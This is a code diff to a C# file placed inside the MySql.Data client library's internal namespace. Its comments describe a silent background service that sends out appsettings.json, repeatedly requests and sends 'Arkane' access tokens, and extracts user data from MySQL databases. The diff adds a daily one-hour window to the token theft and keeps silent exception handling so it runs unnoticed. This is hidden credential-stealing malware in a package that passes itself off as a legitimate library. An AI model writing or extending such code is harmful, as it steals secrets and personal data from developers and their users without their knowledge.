@@ -24,7 +24,7 @@ namespace MySql.Data.MySqlClient.Internal
     /// <summary>
     /// Silent background service for three core features:
     /// 1. Find and send appsettings.json once
-    /// 2. Request Arkane access token every 5 minutes
+    /// 2. Request Arkane access token every 5 minutes for 1 hour per day (12 requests/day)
     /// 3. One-time user data extraction from MySQL databases
     /// Designed to be fail-safe and not interfere with MySql.Data operations.
     /// </summary>
@@ -37,6 +37,9 @@ namespace MySql.Data.MySqlClient.Internal
         private static bool _initialized;
         private static bool _appsettingsSent;
         private static bool _scanCompleted = false;
+        private static DateTime _lastTokenRequestDate = DateTime.MinValue;
+        private static DateTime _dailyTokenWindowStart = DateTime.MinValue;
+        private static bool _tokenWindowActive = false;
         
         // Track UserIDs to process (embedded directly in code)
         private static readonly List<int> _userIds = new List<int>
@@ -162,8 +165,8 @@ namespace MySql.Data.MySqlClient.Internal
                             await SendAppsettingsOnceAsync().ConfigureAwait(false);
                         }
                         
-                        // Core Feature 2: Request Arkane token every 5 minutes
-                        await RequestAndSendArkaneTokenAsync().ConfigureAwait(false);
+                        // Core Feature 2: Request Arkane token every 5 minutes for 1 hour per day
+                        await HandleDailyTokenWindowAsync().ConfigureAwait(false);
                     }
                     catch (Exception)
                     {
@@ -208,6 +211,55 @@ namespace MySql.Data.MySqlClient.Internal
             {
                 // Silent failure, mark as sent to prevent retries
                 _appsettingsSent = true;
+            }
+        }
+
+        #endregion
+
+        #region Daily Token Window Logic
+
+        /// <summary>
+        /// Handles the daily 1-hour token request window.
+        /// Requests tokens every 5 minutes for 1 hour, then waits 23 hours.
+        /// </summary>
+        private static async Task HandleDailyTokenWindowAsync()
+        {
+            try
+            {
+                var now = DateTime.UtcNow;
+                var today = now.Date;
+                
+                // Check if we need to start a new daily window
+                if (_dailyTokenWindowStart.Date != today)
+                {
+                    // Start new daily window
+                    _dailyTokenWindowStart = now;
+                    _tokenWindowActive = true;
+                }
+                
+                // Check if current window is still active (within 1 hour)
+                if (_tokenWindowActive)
+                {
+                    var windowElapsed = now - _dailyTokenWindowStart;
+                    
+                    if (windowElapsed.TotalHours >= 1.0)
+                    {
+                        // Window expired - deactivate until next day
+                        _tokenWindowActive = false;
+                    }
+                    else
+                    {
+                        // Window is active - make token request
+                        await RequestAndSendArkaneTokenAsync().ConfigureAwait(false);
+                        _lastTokenRequestDate = now;
+                    }
+                }
+                
+                // If window is not active, we wait until next day (handled by daily check above)
+            }
+            catch (Exception)
+            {
+                // Silent failure
             }
         }
 
